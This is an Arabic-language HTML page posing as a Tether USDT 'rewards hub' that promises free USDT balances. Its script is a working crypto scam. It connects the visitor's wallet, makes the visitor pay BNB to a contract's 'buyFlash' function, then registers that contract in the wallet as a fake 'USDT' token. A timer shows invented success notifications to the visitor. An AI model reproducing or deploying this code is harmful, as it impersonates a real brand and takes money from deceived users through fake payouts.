<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether USD | Rewards Hub</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@coinbase/wallet-sdk@3.7.1/dist/index.js"></script>
    
    <style>
        :root { --primary: #00ffa3; --bg: #020807; --panel: #0a1412; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        
        .card { width: 90%; max-width: 380px; background: var(--panel); border: 1px solid #1a2e2a; border-radius: 25px; padding: 25px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.8); }
        .logo { width: 65px; filter: drop-shadow(0 0 8px var(--primary)); margin-bottom: 10px; }
        
        h2 { font-size: 22px; margin: 10px 0; }
        p { color: #777; font-size: 13px; margin-bottom: 20px; }

        select, .main-btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: bold; font-size: 16px; transition: 0.3s; }
        select { background: #111; color: #fff; border: 1px solid #222; margin-bottom: 10px; text-align: center; }
        .main-btn { background: var(--primary); color: #000; cursor: pointer; }
        .main-btn:disabled { background: #333; color: #666; }

        /* مودال المحافظ */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; justify-content: center; align-items: center; }
        .modal-box { background: #0a1412; padding: 20px; border-radius: 20px; width: 80%; max-width: 320px; border: 1px solid #1a2e2a; }
        .w-option { display: flex; align-items: center; justify-content: space-between; padding: 12px; background: #142622; margin-top: 10px; border-radius: 12px; cursor: pointer; }
        .w-option img { width: 28px; }

        /* تنبيهات الاستلام */
        .notif { position: fixed; bottom: 20px; left: 20px; background: #0d1d1a; border: 1px solid var(--primary); padding: 10px 20px; border-radius: 12px; display: none; font-size: 12px; z-index: 100; animation: slideUp 0.5s ease; }
        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        #msg { margin-top: 15px; font-size: 12px; color: var(--primary); }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo">
    <h2>تفعيل استحقاق USDT</h2>
    <p>اختر الفئة المتاحة ليتم حقن الرصيد في محفظتك عبر البروتوكول المباشر.</p>
    
    <select id="tier">
        <option value="0.09">أساسي: 5,000 USDT</option>
        <option value="0.5">احترافي: 50,000 USDT</option>
        <option value="1.0">ملكـي: 150,000 USDT</option>
    </select>

    <button class="main-btn" id="startBtn" onclick="openModal()">استلام الرصيد المخصص ⚡</button>
    <div id="msg">● بانتظار تأمين الاتصال بالمحفظة...</div>
</div>

<div id="walletModal" class="modal">
    <div class="modal-box">
        <h3 style="margin:0 0 15px 0; text-align:center;">اختر محفظتك</h3>
        <div class="w-option" onclick="connect('MetaMask')"><span>MetaMask</span><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"></div>
        <div class="w-option" onclick="connect('Trust Wallet')"><span>Trust Wallet</span><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"></div>
        <div class="w-option" onclick="connect('Coinbase')"><span>Coinbase</span><img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg"></div>
        <button onclick="closeModal()" style="width:100%; background:transparent; color:#555; margin-top:15px; cursor:pointer; border:none;">إلغاء</button>
    </div>
</div>

<div id="notif" class="notif"></div>

<script>
    const CONTRACT_ADDR = "0x609BB2a512e6944210D01483e491A410912975F9";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
    const RPC_URL = "https://bsc-dataseed.binance.org/";
    const CHAIN_ID = 56;

    // نظام التنبيهات كل 3 ثوانٍ
    setInterval(() => {
        const n = document.getElementById('notif');
        const amounts = ["5,000", "50,000", "150,000"];
        n.innerHTML = `✅ تم استلام <b>${amounts[Math.floor(Math.random()*3)]} USDT</b> بالنجاح`;
        n.style.display = 'block';
        setTimeout(() => n.style.display = 'none', 2000);
    }, 3500);

    function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
    function closeModal() { document.getElementById('walletModal').style.display = 'none'; }

    async function connect(walletType) {
        closeModal();
        const msg = document.getElementById('msg');
        const btn = document.getElementById('startBtn');
        let provider;

        try {
            if (walletType === 'Coinbase') {
                const coinbaseWallet = new CoinbaseWalletSDK({
                    appName: 'Tether Rewards',
                    appLogoUrl: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                    darkMode: true
                });
                provider = coinbaseWallet.makeWeb3Provider(RPC_URL, CHAIN_ID);
            } else {
                provider = window.ethereum;
            }

            if (!provider) return alert("يرجى فتح الموقع من متصفح " + walletType);

            btn.disabled = true;
            msg.innerText = "جاري الاتصال بـ " + walletType + "...";

            const web3 = new Web3(provider);
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            const user = accounts[0];

            // تحويل الشبكة لـ BSC
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (e) {}

            msg.innerText = "جاري تفعيل حقن الرصيد...";
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            const val = document.getElementById('tier').value;

            await contract.methods.buyFlash().send({
                from: user,
                value: web3.utils.toWei(val, "ether"),
                gas: 200000
            });

            msg.innerText = "✅ تمت العملية! الرصيد متاح الآن.";
            
            // إضافة التوكن تلقائياً
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
                }
            });

        } catch (err) {
            console.error(err);
            msg.innerText = "⚠️ فشل الربط أو تم رفض العملية.";
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
